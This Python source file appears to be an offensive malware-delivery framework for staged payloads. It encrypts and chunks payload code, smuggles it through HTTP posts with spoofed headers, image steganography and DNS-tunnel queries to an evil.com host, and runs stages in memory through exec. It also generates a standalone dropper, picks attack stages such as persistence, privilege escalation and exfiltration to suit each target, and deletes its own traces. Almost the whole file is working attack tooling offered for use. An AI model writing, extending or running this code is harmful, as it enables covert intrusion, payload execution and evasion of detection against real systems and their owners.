"""
Staged Payload Delivery System
Advanced multi-stage payload delivery with dynamic loading and in-memory execution
"""

import base64
import zlib
import random
import time
import os
import tempfile
import hashlib
import threading
from typing import Dict, List, Optional, Callable, Any
import requests
import json
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import importlib.util
import sys
import types

class StagedPayloadDelivery:
    """Multi-stage payload delivery system"""
    
    def __init__(self, encryption_key: bytes = None):
        self.encryption_key = encryption_key or Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.stages = {}
        self.loaded_modules = {}
        self.execution_queue = []
        self.stage_callbacks = {}
        
        # Stage types
        self.STAGE_TYPES = {
            'RECONNAISSANCE': 1,
            'PERSISTENCE': 2, 
            'PRIVILEGE_ESCALATION': 3,
            'LATERAL_MOVEMENT': 4,
            'DATA_COLLECTION': 5,
            'EXFILTRATION': 6,
            'CLEANUP': 7
        }
        
        # Delivery methods
        self.delivery_methods = [
            'http_chunked',
            'dns_tunneling',
            'steganography',
            'social_media',
            'cloud_storage',
            'p2p_network'
        ]
        
    def create_stage(self, stage_id: str, stage_type: int, payload_code: str, 
                    dependencies: List[str] = None, conditions: Dict = None) -> Dict:
        """Create a new payload stage"""
        try:
            # Encrypt payload
            encrypted_payload = self.cipher.encrypt(payload_code.encode())
            
            # Compress for smaller size
            compressed_payload = zlib.compress(encrypted_payload)
            
            # Create stage metadata
            stage = {
                'id': stage_id,
                'type': stage_type,
                'payload': base64.b64encode(compressed_payload).decode(),
                'dependencies': dependencies or [],
                'conditions': conditions or {},
                'created': time.time(),
                'checksum': hashlib.sha256(payload_code.encode()).hexdigest(),
                'size': len(compressed_payload),
                'executed': False
            }
            
            self.stages[stage_id] = stage
            return stage
            
        except Exception as e:
            print(f"Stage creation failed: {e}")
            return {}
            
    def split_payload_into_chunks(self, payload: str, chunk_size: int = 1024) -> List[str]:
        """Split payload into smaller chunks for delivery"""
        try:
            # Encrypt and compress payload
            encrypted = self.cipher.encrypt(payload.encode())
            compressed = zlib.compress(encrypted)
            encoded = base64.b64encode(compressed).decode()
            
            # Split into chunks
            chunks = []
            for i in range(0, len(encoded), chunk_size):
                chunk = encoded[i:i + chunk_size]
                chunks.append(chunk)
                
            return chunks
            
        except Exception as e:
            print(f"Payload splitting failed: {e}")
            return []
            
    def reassemble_chunks(self, chunks: List[str]) -> str:
        """Reassemble payload from chunks"""
        try:
            # Combine chunks
            encoded_payload = ''.join(chunks)
            
            # Decode and decompress
            compressed = base64.b64decode(encoded_payload)
            encrypted = zlib.decompress(compressed)
            payload = self.cipher.decrypt(encrypted).decode()
            
            return payload
            
        except Exception as e:
            print(f"Chunk reassembly failed: {e}")
            return ""
            
    def deliver_via_http_chunked(self, stage_id: str, target_url: str) -> bool:
        """Deliver stage via HTTP chunked transfer"""
        try:
            if stage_id not in self.stages:
                return False
                
            stage = self.stages[stage_id]
            chunks = self.split_payload_into_chunks(stage['payload'])
            
            # Send chunks with random delays
            for i, chunk in enumerate(chunks):
                data = {
                    'stage_id': stage_id,
                    'chunk_id': i,
                    'total_chunks': len(chunks),
                    'data': chunk
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                
                response = requests.post(target_url, json=data, headers=headers, timeout=30)
                
                if response.status_code != 200:
                    return False
                    
                # Random delay between chunks
                time.sleep(random.uniform(0.5, 2.0))
                
            return True
            
        except Exception as e:
            print(f"HTTP chunked delivery failed: {e}")
            return False
            
    def deliver_via_steganography(self, stage_id: str, cover_image_path: str, 
                                 output_path: str) -> bool:
        """Deliver stage hidden in image using steganography"""
        try:
            if stage_id not in self.stages:
                return False
                
            # Import Pillow for image manipulation
            try:
                from PIL import Image
            except ImportError:
                print("Pillow not available for steganography")
                return False
                
            stage = self.stages[stage_id]
            payload_data = stage['payload'].encode()
            
            # Open cover image
            img = Image.open(cover_image_path)
            img = img.convert('RGB')
            
            # Convert payload to binary
            binary_payload = ''.join(format(byte, '08b') for byte in payload_data)
            
            # Add delimiter
            binary_payload += '1111111111111110'  # End marker
            
            pixels = list(img.getdata())
            
            if len(binary_payload) > len(pixels) * 3:
                print("Payload too large for cover image")
                return False
                
            # Hide payload in LSBs
            pixel_index = 0
            bit_index = 0
            
            for i, pixel in enumerate(pixels):
                if bit_index >= len(binary_payload):
                    break
                    
                r, g, b = pixel
                
                # Modify LSB of each color channel
                if bit_index < len(binary_payload):
                    r = (r & 0xFE) | int(binary_payload[bit_index])
                    bit_index += 1
                    
                if bit_index < len(binary_payload):
                    g = (g & 0xFE) | int(binary_payload[bit_index])
                    bit_index += 1
                    
                if bit_index < len(binary_payload):
                    b = (b & 0xFE) | int(binary_payload[bit_index])
                    bit_index += 1
                    
                pixels[i] = (r, g, b)
                
            # Save stego image
            stego_img = Image.new('RGB', img.size)
            stego_img.putdata(pixels)
            stego_img.save(output_path)
            
            return True
            
        except Exception as e:
            print(f"Steganography delivery failed: {e}")
            return False
            
    def extract_from_steganography(self, stego_image_path: str) -> str:
        """Extract payload from steganographic image"""
        try:
            from PIL import Image
            
            img = Image.open(stego_image_path)
            img = img.convert('RGB')
            pixels = list(img.getdata())
            
            binary_data = ""
            
            for pixel in pixels:
                r, g, b = pixel
                binary_data += str(r & 1)
                binary_data += str(g & 1)
                binary_data += str(b & 1)
                
            # Find end marker
            end_marker = '1111111111111110'
            end_pos = binary_data.find(end_marker)
            
            if end_pos == -1:
                print("No valid payload found in image")
                return ""
                
            # Extract payload binary
            payload_binary = binary_data[:end_pos]
            
            # Convert to bytes
            payload_bytes = bytearray()
            for i in range(0, len(payload_binary), 8):
                byte = payload_binary[i:i+8]
                if len(byte) == 8:
                    payload_bytes.append(int(byte, 2))
                    
            return payload_bytes.decode()
            
        except Exception as e:
            print(f"Steganography extraction failed: {e}")
            return ""
            
    def deliver_via_dns_tunneling(self, stage_id: str, dns_server: str) -> bool:
        """Deliver stage via DNS tunneling"""
        try:
            if stage_id not in self.stages:
                return False
                
            import socket
            
            stage = self.stages[stage_id]
            chunks = self.split_payload_into_chunks(stage['payload'], 63)  # DNS label limit
            
            # Send each chunk as DNS query
            for i, chunk in enumerate(chunks):
                # Create DNS query with chunk as subdomain
                query_domain = f"{i}.{chunk}.{stage_id}.evil.com"
                
                try:
                    socket.gethostbyname(query_domain)
                except socket.gaierror:
                    pass  # Expected for non-existent domain
                    
                time.sleep(random.uniform(0.1, 0.5))
                
            return True
            
        except Exception as e:
            print(f"DNS tunneling delivery failed: {e}")
            return False
            
    def load_stage_in_memory(self, stage_id: str) -> Optional[types.ModuleType]:
        """Load and execute stage entirely in memory"""
        try:
            if stage_id not in self.stages:
                return None
                
            stage = self.stages[stage_id]
            
            # Decrypt and decompress payload
            compressed_payload = base64.b64decode(stage['payload'])
            encrypted_payload = zlib.decompress(compressed_payload)
            payload_code = self.cipher.decrypt(encrypted_payload).decode()
            
            # Verify checksum
            calculated_checksum = hashlib.sha256(payload_code.encode()).hexdigest()
            if calculated_checksum != stage['checksum']:
                print(f"Checksum mismatch for stage {stage_id}")
                return None
                
            # Create module in memory
            module_name = f"stage_{stage_id}_{int(time.time())}"
            spec = importlib.util.spec_from_loader(module_name, loader=None)
            module = importlib.util.module_from_spec(spec)
            
            # Execute code in module namespace
            exec(payload_code, module.__dict__)
            
            # Add to loaded modules
            self.loaded_modules[stage_id] = module
            stage['executed'] = True
            
            return module
            
        except Exception as e:
            print(f"In-memory stage loading failed: {e}")
            return None
            
    def execute_stage_sequence(self, stage_sequence: List[str]) -> bool:
        """Execute stages in sequence with dependency checking"""
        try:
            executed_stages = []
            
            for stage_id in stage_sequence:
                if stage_id not in self.stages:
                    print(f"Stage {stage_id} not found")
                    return False
                    
                stage = self.stages[stage_id]
                
                # Check dependencies
                for dep in stage.get('dependencies', []):
                    if dep not in executed_stages:
                        print(f"Dependency {dep} not satisfied for stage {stage_id}")
                        return False
                        
                # Check conditions
                conditions = stage.get('conditions', {})
                if not self.check_execution_conditions(conditions):
                    print(f"Execution conditions not met for stage {stage_id}")
                    continue
                    
                # Execute stage
                module = self.load_stage_in_memory(stage_id)
                if module:
                    # Run stage main function if exists
                    if hasattr(module, 'main'):
                        try:
                            result = module.main()
                            print(f"Stage {stage_id} executed with result: {result}")
                        except Exception as e:
                            print(f"Stage {stage_id} execution failed: {e}")
                            
                    executed_stages.append(stage_id)
                    
                    # Call callback if registered
                    if stage_id in self.stage_callbacks:
                        self.stage_callbacks[stage_id](stage_id, module)
                        
                # Random delay between stages
                time.sleep(random.uniform(1, 5))
                
            return True
            
        except Exception as e:
            print(f"Stage sequence execution failed: {e}")
            return False
            
    def check_execution_conditions(self, conditions: Dict) -> bool:
        """Check if execution conditions are met"""
        try:
            # Time-based conditions
            if 'min_time' in conditions:
                if time.time() < conditions['min_time']:
                    return False
                    
            if 'max_time' in conditions:
                if time.time() > conditions['max_time']:
                    return False
                    
            # System conditions
            if 'min_free_memory' in conditions:
                import psutil
                if psutil.virtual_memory().available < conditions['min_free_memory']:
                    return False
                    
            if 'required_os' in conditions:
                import platform
                if platform.system().lower() != conditions['required_os'].lower():
                    return False
                    
            # Network conditions
            if 'network_required' in conditions and conditions['network_required']:
                try:
                    requests.get('http://www.google.com', timeout=5)
                except:
                    return False
                    
            return True
            
        except Exception as e:
            print(f"Condition checking failed: {e}")
            return False
            
    def register_stage_callback(self, stage_id: str, callback: Callable):
        """Register callback for stage completion"""
        self.stage_callbacks[stage_id] = callback
        
    def self_destruct_stage(self, stage_id: str) -> bool:
        """Remove stage from memory and storage"""
        try:
            # Remove from memory
            if stage_id in self.loaded_modules:
                del self.loaded_modules[stage_id]
                
            # Remove stage data
            if stage_id in self.stages:
                del self.stages[stage_id]
                
            # Force garbage collection
            import gc
            gc.collect()
            
            return True
            
        except Exception as e:
            print(f"Stage self-destruct failed: {e}")
            return False
            
    def create_payload_dropper(self, stages: List[str], output_path: str) -> bool:
        """Create a standalone dropper for stage delivery"""
        try:
            dropper_code = f'''
import base64
import zlib
import time
import random
from cryptography.fernet import Fernet

class StageDropper:
    def __init__(self):
        self.key = {self.encryption_key!r}
        self.cipher = Fernet(self.key)
        self.stages = {json.dumps({k: v for k, v in self.stages.items() if k in stages})}
        
    def execute_all_stages(self):
        for stage_id, stage_data in self.stages.items():
            try:
                # Decrypt and execute stage
                compressed = base64.b64decode(stage_data['payload'])
                encrypted = zlib.decompress(compressed)
                code = self.cipher.decrypt(encrypted).decode()
                
                exec(code, globals())
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"Stage {{stage_id}} failed: {{e}}")
                
if __name__ == "__main__":
    dropper = StageDropper()
    dropper.execute_all_stages()
'''
            
            with open(output_path, 'w') as f:
                f.write(dropper_code)
                
            return True
            
        except Exception as e:
            print(f"Dropper creation failed: {e}")
            return False
            
    def adaptive_stage_delivery(self, target_info: Dict) -> List[str]:
        """Adaptively select stages based on target environment"""
        try:
            selected_stages = []
            
            # Basic reconnaissance always first
            recon_stages = [k for k, v in self.stages.items() 
                           if v['type'] == self.STAGE_TYPES['RECONNAISSANCE']]
            selected_stages.extend(recon_stages)
            
            # Select based on target OS
            target_os = target_info.get('os', '').lower()
            
            if 'windows' in target_os:
                # Windows-specific stages
                windows_stages = [k for k, v in self.stages.items() 
                                if 'windows' in v.get('conditions', {}).get('required_os', '').lower()]
                selected_stages.extend(windows_stages)
                
            elif 'linux' in target_os:
                # Linux-specific stages
                linux_stages = [k for k, v in self.stages.items() 
                              if 'linux' in v.get('conditions', {}).get('required_os', '').lower()]
                selected_stages.extend(linux_stages)
                
            # Select based on privileges
            if target_info.get('is_admin', False):
                # Privilege escalation not needed
                priv_stages = [k for k, v in self.stages.items() 
                             if v['type'] != self.STAGE_TYPES['PRIVILEGE_ESCALATION']]
            else:
                # Include privilege escalation
                priv_stages = [k for k, v in self.stages.items() 
                             if v['type'] == self.STAGE_TYPES['PRIVILEGE_ESCALATION']]
                selected_stages.extend(priv_stages)
                
            # Add persistence stages
            persistence_stages = [k for k, v in self.stages.items() 
                                if v['type'] == self.STAGE_TYPES['PERSISTENCE']]
            selected_stages.extend(persistence_stages)
            
            # Remove duplicates while preserving order
            seen = set()
            final_stages = []
            for stage in selected_stages:
                if stage not in seen:
                    seen.add(stage)
                    final_stages.append(stage)
                    
            return final_stages
            
        except Exception as e:
            print(f"Adaptive stage selection failed: {e}")
            return []
